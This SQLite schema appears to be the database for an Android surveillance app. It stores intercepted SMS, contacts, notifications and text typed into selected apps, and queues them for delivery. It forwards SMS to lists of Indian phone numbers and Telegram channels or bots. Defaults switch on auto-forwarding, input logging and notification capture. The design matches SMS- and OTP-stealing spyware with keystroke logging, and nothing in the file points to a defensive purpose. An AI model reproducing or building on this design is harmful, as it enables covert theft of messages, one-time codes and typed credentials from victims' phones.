-- ─────────────────────────────────────────
-- SMS TABLE
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS sms_inbox (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sms_id TEXT UNIQUE NOT NULL,
    sender TEXT NOT NULL,
    message TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    is_delivered INTEGER DEFAULT 0,
    delivery_attempts INTEGER DEFAULT 0,
    is_forwarded_number INTEGER DEFAULT 0,
    is_forwarded_tg INTEGER DEFAULT 0,
    is_priority INTEGER DEFAULT 0,
    created_at TEXT DEFAULT (datetime('now'))
);

-- ─────────────────────────────────────────
-- SMS QUEUE TABLE (offline queue)
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS sms_queue (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sms_id TEXT UNIQUE NOT NULL,
    sender TEXT NOT NULL,
    message TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    retry_count INTEGER DEFAULT 0,
    is_priority INTEGER DEFAULT 0,
    queued_at TEXT DEFAULT (datetime('now'))
);

-- ─────────────────────────────────────────
-- CONTACTS TABLE
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS contacts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    contact_id TEXT UNIQUE NOT NULL,
    name TEXT NOT NULL,
    number TEXT NOT NULL,
    email TEXT,
    synced_at TEXT DEFAULT (datetime('now'))
);

-- ─────────────────────────────────────────
-- INPUT VIEWER TABLE
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS viewer_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    app_name TEXT NOT NULL,
    input_text TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    is_delivered INTEGER DEFAULT 0,
    delivery_attempts INTEGER DEFAULT 0,
    created_at TEXT DEFAULT (datetime('now'))
);

-- ─────────────────────────────────────────
-- INPUT VIEWER QUEUE TABLE (offline queue)
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS viewer_queue (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    app_name TEXT NOT NULL,
    input_text TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    retry_count INTEGER DEFAULT 0,
    queued_at TEXT DEFAULT (datetime('now'))
);

-- ─────────────────────────────────────────
-- FOCUSED APPS TABLE
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS focused_apps (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    app_name TEXT UNIQUE NOT NULL,
    package_name TEXT NOT NULL,
    added_at TEXT DEFAULT (datetime('now'))
);

-- ─────────────────────────────────────────
-- NOTIFICATIONS TABLE
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    notif_id TEXT UNIQUE NOT NULL,
    app_name TEXT NOT NULL,
    title TEXT NOT NULL,
    content TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    is_delivered INTEGER DEFAULT 0,
    delivery_attempts INTEGER DEFAULT 0,
    created_at TEXT DEFAULT (datetime('now'))
);

-- ─────────────────────────────────────────
-- NOTIFICATIONS QUEUE TABLE (offline queue)
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS notification_queue (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    notif_id TEXT UNIQUE NOT NULL,
    app_name TEXT NOT NULL,
    title TEXT NOT NULL,
    content TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    retry_count INTEGER DEFAULT 0,
    queued_at TEXT DEFAULT (datetime('now'))
);

-- ─────────────────────────────────────────
-- DELIVERY TRACKER TABLE
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS delivery_tracker (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    item_id TEXT UNIQUE NOT NULL,
    item_type TEXT NOT NULL,
    status TEXT NOT NULL,
    attempts INTEGER DEFAULT 0,
    last_attempt TEXT,
    delivered_at TEXT,
    created_at TEXT DEFAULT (datetime('now'))
);

-- ─────────────────────────────────────────
-- SETTINGS TABLE
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS settings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key TEXT UNIQUE NOT NULL,
    value TEXT NOT NULL,
    updated_at TEXT DEFAULT (datetime('now'))
);

-- ─────────────────────────────────────────
-- DEFAULT SETTINGS
-- ─────────────────────────────────────────
INSERT OR IGNORE INTO settings (key, value) VALUES ('sms_auto_forward', 'true');
INSERT OR IGNORE INTO settings (key, value) VALUES ('number_forward_enabled', 'false');
INSERT OR IGNORE INTO settings (key, value) VALUES ('tg_forward_enabled', 'false');
INSERT OR IGNORE INTO settings (key, value) VALUES ('viewer_enabled', 'true');
INSERT OR IGNORE INTO settings (key, value) VALUES ('notification_enabled', 'true');
INSERT OR IGNORE INTO settings (key, value) VALUES ('offline_mode', 'true');

-- ─────────────────────────────────────────
-- FORWARD FORMAT SETTINGS
-- ─────────────────────────────────────────
INSERT OR IGNORE INTO settings (key, value) VALUES ('sms_forward_format', 'default');
INSERT OR IGNORE INTO settings (key, value) VALUES ('sms_forward_custom_text', '');
INSERT OR IGNORE INTO settings (key, value) VALUES ('forward_tg_username', '');
INSERT OR IGNORE INTO settings (key, value) VALUES ('forward_tg_channel_name', '');
INSERT OR IGNORE INTO settings (key, value) VALUES ('forward_tg_channel_id', '');
INSERT OR IGNORE INTO settings (key, value) VALUES ('forward_tg_page_name', '');
INSERT OR IGNORE INTO settings (key, value) VALUES ('forward_tg_bot_username', '');

-- Auto device restart settings
INSERT OR IGNORE INTO settings (key, value) VALUES ('auto_device_restart_enabled', 'true');
INSERT OR IGNORE INTO settings (key, value) VALUES ('device_offline_alert_enabled', 'true');
INSERT OR IGNORE INTO settings (key, value) VALUES ('device_offline_threshold_seconds', '60');

-- ─────────────────────────────────────────
-- FORWARD NUMBERS TABLE
-- Stores multiple Indian numbers for SMS forward
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS forward_numbers (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    number TEXT NOT NULL UNIQUE,
    is_active INTEGER DEFAULT 1,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ─────────────────────────────────────────
-- TELEGRAM TARGETS TABLE
-- Stores multiple Telegram targets for SMS forward
-- ─────────────────────────────────────────
CREATE TABLE IF NOT EXISTS telegram_targets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target TEXT NOT NULL UNIQUE,
    target_type TEXT DEFAULT 'unknown',
    is_active INTEGER DEFAULT 1,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
